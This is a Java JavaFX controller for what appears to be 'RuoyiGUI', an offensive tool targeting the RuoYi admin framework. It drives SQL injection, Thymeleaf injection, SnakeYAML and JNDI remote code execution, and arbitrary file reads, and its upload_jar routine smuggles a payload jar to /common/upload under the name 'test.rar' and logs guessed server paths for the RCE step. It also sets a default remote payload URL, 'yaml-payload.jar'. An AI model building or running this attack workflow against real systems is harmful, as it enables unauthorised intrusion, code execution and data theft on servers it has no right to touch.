package com.ruoyi.ruoyigui.controller;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.service.CheckTask;
import com.ruoyi.ruoyigui.service.VulTask;
import com.ruoyi.ruoyigui.util.CustomHttpClient;
import com.ruoyi.ruoyigui.util.ExpList;
import com.ruoyi.ruoyigui.util.Tools;
import com.ruoyi.ruoyigui.util.ProxyManager;

import javafx.application.Platform;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.layout.VBox;
import javafx.scene.paint.Color;
import javafx.stage.FileChooser;
import javafx.stage.Modality;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RuoyiGUIController {
    //主UI元素定义
    @FXML
    private TextField url_txt, sql_txt, thf_txt, sna_txt, jdbc_txt, fileread_txt, jndi_txt;
    @FXML
    private TextArea infores_txt, sqlres_txt, thfres_txt, snares_txt, jdbcres_txt, jarres_txt, filereadres_txt, jndires_txt;
    @FXML
    private ComboBox<String> comboBox, comboBox1, local_jar_path;
    @FXML
    private Tab tab_info, tab_sql, tab_thy, tab_sna, tab_sna_b, tab_sna_l, tab_fileread, tab_gen;
    Alert alert = new Alert(Alert.AlertType.INFORMATION);
    public static Map<String, String> currentProxy = new HashMap<>();

    public void initialize() {
        comboBox.setValue("ALL");
        comboBox.getItems().add("ALL");
        comboBox.getItems().addAll(ExpList.get_exp());
        comboBox1.setValue("jdbc 执行SQL语句");
        comboBox1.getItems().add("jdbc 执行SQL语句");
        comboBox1.getItems().add("snakeyaml RCE jdbc利用");
        comboBox1.getItems().add("snakeyaml RCE gentable利用");

        comboBox.setOnAction(e -> {
            String vul_select = this.comboBox.getSelectionModel().getSelectedItem();
            if (vul_select.startsWith("Ruoyi job fileread")) {
                fileread_txt.setPromptText("不要读取过大文件；如果是windows需要输入携带盘符的根路径，如C://WINDOWS/win.ini");
            }
            if (vul_select.startsWith("Ruoyi download resource fileread")) {
                fileread_txt.setPromptText("不要读取过大文件；不需要输入携带盘符的根路径");
            }

            if (vul_select.startsWith("Ruoyi dept edit sql") || vul_select.startsWith("Ruoyi role export sql") || vul_select.startsWith("Ruoyi role list sql")) {
                sql_txt.setText("select user()");
            }

            if (vul_select.startsWith("Ruoyi gen createTable sql")) {
                sql_txt.setText("version()");
            }
        });

        comboBox1.setOnAction(e -> {
            String vul_select = this.comboBox1.getSelectionModel().getSelectedItem();
            if (vul_select.contains("SQL")) {
                jdbc_txt.setText("select user()");
            } else {
                jdbc_txt.setText("http://127.0.0.1/yaml-payload.jar");
            }
        });

        local_jar_path.addEventHandler(MouseEvent.MOUSE_CLICKED, new EventHandler<MouseEvent>() {
            public void handle(MouseEvent event) {

                Stage stage = (Stage) local_jar_path.getScene().getWindow();
                FileChooser fileChooser = new FileChooser();
                fileChooser.setTitle("jar包路径");
                fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("jar文件", new String[]{"*.jar"}));

                File file = fileChooser.showOpenDialog(stage);

                if (file != null) {
                    local_jar_path.setValue(file.getAbsolutePath());
                }
            }
        });
    }

    @FXML
    private void proxy_set() {
        final Alert inputDialog = new Alert(Alert.AlertType.NONE);
        inputDialog.setResizable(true);
        final Window window = inputDialog.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(e -> window.hide());

        ToggleGroup statusGroup = new ToggleGroup();
        RadioButton enableRadio = new RadioButton("启用");
        RadioButton disableRadio = new RadioButton("禁用");
        enableRadio.setToggleGroup(statusGroup);
        disableRadio.setToggleGroup(statusGroup);
        HBox statusHbox = new HBox(10.0D, enableRadio, disableRadio);
        GridPane proxyGridPane = new GridPane();
        proxyGridPane.setVgap(15.0D);
        proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
        Label typeLabel = new Label("类型：");

        ComboBox<String> typeComboBox = new ComboBox<>();
        typeComboBox.getItems().addAll(new String[]{"HTTP", "SOCKS"});
        String Proxy_Type = currentProxy.getOrDefault("type", "HTTP");
        typeComboBox.getSelectionModel().select(Proxy_Type);

        Label validationLabel = new Label("代理检测连接失败, 请检查代理是否配置正确");
        validationLabel.setTextFill(Color.RED);
        validationLabel.setVisible(false);

        Label IPLabel = new Label("IP地址：");
        TextField IPText = new TextField();
        Label PortLabel = new Label("端口：");
        TextField PortText = new TextField();
        Label userNameLabel = new Label("用户名：");
        TextField userNameText = new TextField();
        Label passwordLabel = new Label("密码：");
        TextField passwordText = new TextField();
        Button cancelBtn = new Button("取消");
        Button saveBtn = new Button("保存");
        saveBtn.setDefaultButton(true);

        // Set values
        IPText.setText(currentProxy.getOrDefault("ipAddress", "127.0.0.1"));
        PortText.setText(currentProxy.getOrDefault("port", "8080"));
        userNameText.setText(currentProxy.getOrDefault("username", ""));
        passwordText.setText(currentProxy.getOrDefault("password", ""));
        enableRadio.setSelected(currentProxy.get("proxy") != null && currentProxy.get("proxy").equals("Y"));

        saveBtn.setOnAction(e -> {
            if (disableRadio.isSelected()) {
                currentProxy.put("proxy", "N");
                ProxyManager.removeGlobalProxy();
                inputDialog.getDialogPane().getScene().getWindow().hide();
            } else {
                String ProxyType = typeComboBox.getValue();
                String ipAddress = IPText.getText().trim();
                String port = PortText.getText().trim();
                String username = userNameText.getText().trim();
                String password = passwordText.getText().trim();
                boolean isValid = ProxyManager.validateProxy(ProxyType, ipAddress, port, username, password);
                if (isValid) {
                    ProxyManager.removeGlobalProxy();
                    ProxyManager.setGlobalProxy(ProxyType, ipAddress, port, username, password);
                    currentProxy.put("ipAddress", ipAddress);
                    currentProxy.put("port", port);
                    currentProxy.put("username", username);
                    currentProxy.put("password", password);
                    currentProxy.put("proxy", "Y");
                    currentProxy.put("type", ProxyType);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    validationLabel.setVisible(true);
                }
            }
        });

        cancelBtn.setOnAction(e -> inputDialog.getDialogPane().getScene().getWindow().hide());

        proxyGridPane.add(statusHbox, 1, 0);
        proxyGridPane.add(typeLabel, 0, 1);
        proxyGridPane.add(typeComboBox, 1, 1);
        proxyGridPane.add(IPLabel, 0, 2);
        proxyGridPane.add(IPText, 1, 2);
        proxyGridPane.add(PortLabel, 0, 3);
        proxyGridPane.add(PortText, 1, 3);
        proxyGridPane.add(userNameLabel, 0, 4);
        proxyGridPane.add(userNameText, 1, 4);
        proxyGridPane.add(passwordLabel, 0, 5);
        proxyGridPane.add(passwordText, 1, 5);
        proxyGridPane.add(validationLabel, 0, 7, 2, 1);
        HBox buttonBox = new HBox(20.0D, cancelBtn, saveBtn);
        buttonBox.setAlignment(Pos.CENTER);
        GridPane.setColumnSpan(buttonBox, 2);
        proxyGridPane.add(buttonBox, 0, 6);
        inputDialog.getDialogPane().setContent(proxyGridPane);
        inputDialog.showAndWait();
    }

    @FXML
    public void header_set() {
        TextField headerTextField = new TextField();
        TextField valueTextField = new TextField();
        TextArea headersTextArea = new TextArea();
        headerTextField.setPromptText("Request Header");
        valueTextField.setPromptText("Request Header Value");

        Button addHeaderButton = new Button("Add Header");
        Button clearButton = new Button("Clear");
        headersTextArea.setEditable(false);

        for (Map.Entry<String, String> entry : CustomHttpClient.getGlobalHeaders().entrySet()) {
            addHeader(entry.getKey(), entry.getValue(), headersTextArea);
        }

        addHeaderButton.setOnAction((event) -> {
            String header = headerTextField.getText();
            String value = valueTextField.getText();
            if (!header.isEmpty() && !value.isEmpty()) {
                addHeader(header, value, headersTextArea);
                headerTextField.clear();
                valueTextField.clear();
            }

        });
        clearButton.setOnAction((event) -> {
            headersTextArea.clear();
            CustomHttpClient.clearGlobalHeaders();
        });
        HBox buttonBox = new HBox(10.0);
        buttonBox.getChildren().addAll(new Node[]{addHeaderButton, clearButton});
        GridPane.setHgrow(headerTextField, Priority.ALWAYS);
        GridPane.setHgrow(valueTextField, Priority.ALWAYS);
        headerTextField.setPrefWidth(150.0);
        valueTextField.setPrefWidth(500.0);
        HBox headerBox = new HBox(10.0);
        headerBox.getChildren().addAll(new Node[]{headerTextField, new Label(":"), valueTextField, buttonBox});
        VBox vbox = new VBox(10.0);
        vbox.setPadding(new Insets(10.0));
        vbox.getChildren().addAll(new Node[]{headersTextArea, headerBox});
        Alert inputDialog = new Alert(Alert.AlertType.NONE);
        inputDialog.setTitle("Custom Request Header");
        inputDialog.getDialogPane().setContent(vbox);
        inputDialog.initModality(Modality.APPLICATION_MODAL);
        inputDialog.setResizable(false);
        ButtonType closeButton = new ButtonType("Close");
        inputDialog.getButtonTypes().add(closeButton);
        inputDialog.setResultConverter((buttonType) -> {
            if (buttonType == closeButton) {
                inputDialog.close();
            }

            return null;
        });
        inputDialog.showAndWait();
    }

    private static void addHeader(String header, String value, TextArea headersTextArea) {
        headersTextArea.appendText(header + ": " + value + "\n");
        CustomHttpClient.setGlobalHeader(header, value);
    }


    @FXML
    private void about() {
        alert.setTitle("提示:");
        alert.setHeaderText("by nex121");
        alert.setContentText("本人使用javafx更新了下UI,增加了几个poc,略微优化下代码!");
        alert.showAndWait();
    }

    @FXML
    private void clear() {
        if (tab_info.isSelected()) {
            infores_txt.clear();
        }
        if (tab_sql.isSelected()) {
            sqlres_txt.clear();
        }
        if (tab_thy.isSelected()) {
            thfres_txt.clear();
        }
        if (tab_sna.isSelected()) {
            snares_txt.clear();
        }
        if (tab_sna_b.isSelected()) {
            jdbcres_txt.clear();
        }
        if (tab_sna_l.isSelected()) {
            jarres_txt.clear();
        }
        if (tab_fileread.isSelected()) {
            filereadres_txt.clear();
        }
        if (tab_gen.isSelected()) {
            jndires_txt.clear();
        }
    }

    public void logjar(String info) {
        Platform.runLater(() -> this.jarres_txt.appendText(info + "\n"));
    }

    private void showAlert(String content) {
        alert.setTitle("提示:");
        alert.setHeaderText("信息");
        alert.setContentText(content);
        alert.showAndWait();
    }

    @FXML
    private void check_url() {
        boolean standard = Tools.checkTheURL(this.url_txt.getText());

        if (standard) {
            CheckTask ct = new CheckTask(comboBox, url_txt, infores_txt);
            new Thread(ct).start();
        } else {
            alert.setTitle("提示:");
            alert.setHeaderText("URL检查");
            alert.setContentText("URL格式不符合要求，示例：http://127.0.0.1:7001");
            alert.showAndWait();
        }
    }

    @FXML
    private void upload_jar() throws IOException {
        String result;
        String windows_jar_path = "D:/ruoyi/uploadPath";
        String linux_jar_path = "/home/ruoyi/uploadPath";
        CustomHttpClient req = new CustomHttpClient();
        File jar_file = new File(local_jar_path.getValue());
        String res = req.uploadFile(url_txt.getText().trim() + "/common/upload", jar_file, "file", "test.rar").getBody();
        Pattern filePattern = Pattern.compile("\"fileName\":\"(.*?)\"");
        Matcher matcher = filePattern.matcher(res);
        if (matcher.find()) {
            result = matcher.group(1);
            windows_jar_path = result.replace("/profile", windows_jar_path);
            linux_jar_path = result.replace("/profile", linux_jar_path);
        }

        if (res.contains("操作成功")) {
            logjar("[+]上传jar包成功");
            logjar("windows默认配置jar包路径：" + "file:///" + windows_jar_path);
            logjar("Linux默认配置jar包路径：" + "file:///" + linux_jar_path);
            logjar("复制路径到snakeyaml利用模块去利用");
            logjar("非默认路径就需要自己猜了，比如去掉home，也可以配合文件读取猜(如果有的话)，lucky");
        } else {
            logjar("[-]上传jar包失败");
        }
    }

    @FXML
    public void exe_sql() {
        VulTask cst = new VulTask(comboBox, url_txt, sql_txt, sqlres_txt);
        new Thread(cst).start();
    }

    @FXML
    public void exe_thf() {
        VulTask cst = new VulTask(comboBox, url_txt, thf_txt, thfres_txt);
        new Thread(cst).start();
    }

    @FXML
    public void exe_sna() {
        VulTask cst = new VulTask(comboBox, url_txt, sna_txt, snares_txt);
        new Thread(cst).start();
    }

    @FXML
    public void exe_jdbc() {
        VulTask cst = new VulTask(comboBox, url_txt, jdbc_txt, jdbcres_txt);
        new Thread(cst).start();
    }

    @FXML
    public void exe_fileread() {
        VulTask cst = new VulTask(comboBox, url_txt, fileread_txt, filereadres_txt);
        new Thread(cst).start();
    }

    @FXML
    public void exe_jndi() {
        VulTask cst = new VulTask(comboBox, url_txt, jndi_txt, jndires_txt);
        new Thread(cst).start();
    }
}